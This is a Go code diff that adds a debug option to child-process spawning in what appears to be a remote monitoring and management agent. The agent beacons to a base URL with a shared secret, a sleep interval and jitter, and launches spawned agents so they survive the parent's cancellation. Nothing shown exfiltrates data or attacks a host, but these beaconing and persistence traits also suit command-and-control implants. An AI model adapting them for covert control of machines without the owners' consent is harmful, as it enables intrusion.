@@ -36,12 +36,16 @@ func spawnSessionID(parent string) string {
 // of interleaving appends into the parent's default log path.
 func spawnEnvironment(cfg *config, sessionID string) []string {
 	overrides := map[string]string{
+		"RMM_DEBUG":              "0",
 		"RMM_BASE_URL":           cfg.BaseURL,
 		"RMM_BEACON_SECRET":      cfg.BeaconSecret,
 		"RMM_SESSION_ID":         sessionID,
 		"RMM_AGENT_WORKSPACE_ID": cfg.WorkspaceID,
 		"RMM_SLEEP_SECONDS":      strconv.Itoa(cfg.SleepSeconds),
 		"RMM_JITTER_PERCENT":     strconv.Itoa(cfg.JitterPercent),
+	}
+	if cfg.SpawnDebug {
+		overrides["RMM_DEBUG"] = "1"
 	}
 	if cfg.HTTPProxy != "" {
 		overrides["RMM_HTTP_PROXY"] = cfg.HTTPProxy
@@ -52,7 +56,7 @@ func spawnEnvironment(cfg *config, sessionID string) []string {
 	env := make([]string, 0, len(os.Environ())+len(overrides))
 	for _, entry := range os.Environ() {
 		key, _, _ := strings.Cut(entry, "=")
-		if _, overridden := overrides[key]; !overridden {
+		if _, overridden := overrides[strings.ToUpper(key)]; !overridden {
 			env = append(env, entry)
 		}
 	}
@@ -75,6 +79,7 @@ func spawnAgent(cfg *config) (string, error) {
 // any process is created. Legacy commands retain local identity generation.
 func parseSpawnCommand(command string, cfg *config) (*config, string, error) {
 	childConfig := *cfg
+	childConfig.SpawnDebug = false
 	if strings.TrimSpace(command) == "__SPAWN__" {
 		return &childConfig, spawnSessionID(cfg.SessionID), nil
 	}
@@ -83,6 +88,7 @@ func parseSpawnCommand(command string, cfg *config) (*config, string, error) {
 		return nil, "", errors.New("spawn requires a JSON payload")
 	}
 	var payload struct {
+		Debug       bool    `json:"debug"`
 		SessionID   string  `json:"session_id"`
 		WorkspaceID *string `json:"workspace_id"`
 	}
@@ -92,6 +98,7 @@ func parseSpawnCommand(command string, cfg *config) (*config, string, error) {
 	if !agentSessionIDPattern.MatchString(payload.SessionID) || payload.SessionID == cfg.SessionID {
 		return nil, "", errors.New("spawn requires a fresh token-safe session ID")
 	}
+	childConfig.SpawnDebug = payload.Debug
 	if payload.WorkspaceID != nil {
 		if *payload.WorkspaceID != "" && !agentWorkspaceIDPattern.MatchString(*payload.WorkspaceID) {
 			return nil, "", errors.New("invalid spawn workspace ID")
@@ -116,6 +123,10 @@ func spawnAgentWithIdentity(cfg *config, sessionID string) (string, error) {
 	executable, err := os.Executable()
 	if err != nil {
 		return "", fmt.Errorf("resolve agent executable: %w", err)
+	}
+	executable, err = resolveDebugAgentExecutable(executable, cfg.SpawnDebug)
+	if err != nil {
+		return "", err
 	}
 	// Deliberately exec.Command, not newCommand: newCommand binds children to
 	// agentContext, and canceling this agent must not kill the spawned one.
